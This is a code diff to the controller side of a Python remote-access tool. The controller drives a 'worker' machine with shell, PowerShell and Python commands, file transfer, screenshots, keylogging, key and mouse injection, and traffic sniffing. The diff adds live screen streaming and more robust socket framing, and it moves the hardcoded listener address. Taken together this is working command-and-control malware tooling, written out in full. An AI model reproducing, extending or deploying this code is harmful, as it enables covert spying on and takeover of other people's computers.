@@ -1,10 +1,15 @@
 import socket
 import time
+import tkinter
 from typing import Callable
 import struct
 import sys
 import threading
+
+import cv2
 import keyboard
+import numpy as np
+
 Commend = Callable[[],bytes]
 RETURN = False
 def cmd() -> bytes:
@@ -94,7 +99,8 @@ def listen_to_keys()->bytes:
 def on_key_event(event):
     print(f"Key '{event.name}' was {event.event_type}")
 
-
+def live_stream() -> bytes:
+    return b"live_stream"
 
 def press_key_in_worker() -> bytes:
     global RETURN
@@ -160,6 +166,9 @@ def save_file(received:bytes):
     with open(file_name,"wb") as file:
         file.write(received)
 
+
+
+
 class Master:
     def __init__(self, ip:str, port:int,functions:dict[str, Commend]):
         self.address = (ip,port)
@@ -174,24 +183,73 @@ class Master:
         self.client = self.server.accept()[0]
         print(self.client.recv(1024).decode())
 
-    def receiver(self) ->bytes:
-        data = self.client.recv(4)
-        size = struct.unpack("I", data)[0]
+    def recvall(self, size: int) -> bytes:
+        data = b""
+        while len(data) < size:
+            packet = self.client.recv(size - len(data))
+            if not packet:  # connection closed
+                return b""
+            data += packet
+        return data
+
+    def receiver(self) -> bytes:
+        raw_size = self.recvall(4)
+        if not raw_size:
+            return b""
+        size = struct.unpack("I", raw_size)[0]
         if size == 0:
             return b""
-        message = self.client.recv(4096)
-        size -=4096
-        while size>0:
-            message+=self.client.recv(4096)
-            size-=4096
-            time.sleep(0.01)
+
+        # Read the full frame
+        message = self.recvall(size)
         return message
 
     def sender(self,message:bytes):
         data = struct.pack("I",len(message))+message
         self.client.send(data)
 
+    def show_stream(self):
+        global RETURN
+        root = tkinter.Tk()
+        screen_width = root.winfo_screenwidth()
+        screen_height = root.winfo_screenheight()
+        root.destroy()
+        while True:
+            frame_data = self.receiver()
+            if not frame_data:
+                break
 
+            # Decode JPEG
+            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
+            if frame is None:
+                continue
+
+            # --- Aspect ratio scaling ---
+            h, w, _ = frame.shape
+            scale = min(screen_width / w, screen_height / h)
+            new_w, new_h = int(w * scale), int(h * scale)
+            resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)
+
+            # Place on black canvas
+            canvas = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
+            x_offset = (screen_width - new_w) // 2
+            y_offset = (screen_height - new_h) // 2
+            canvas[y_offset:y_offset + new_h, x_offset:x_offset + new_w] = resized
+
+            cv2.imshow("Live Stream", canvas)
+
+            key = cv2.waitKey(1)
+
+            if cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE) < 1:
+                print("Window closed, stopping video loop...")
+                break
+
+            if key == ord("q"):
+                print("Pressed 'q', stopping video loop...")
+                break
+            self.sender(b"live_stream")
+        RETURN = True
+        cv2.destroyAllWindows()
 
 
     def menu(self) ->str:
@@ -226,6 +284,10 @@ class Master:
                 function = self.menu()
                 continue
             self.sender(message)
+            if function == "live_stream":
+                self.show_stream()
+                continue
+
             received = self.receiver()
             if b"error" == received[:5]:
                 print(received.decode())
@@ -250,30 +312,9 @@ class Master:
 
 
 def main():
-    functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker}
-    master = Master("10.0.0.12",5555,functions)
+    functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
+    master = Master("10.0.0.3",5555,functions)
     master.run()
 
 if __name__ == '__main__':
     main()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
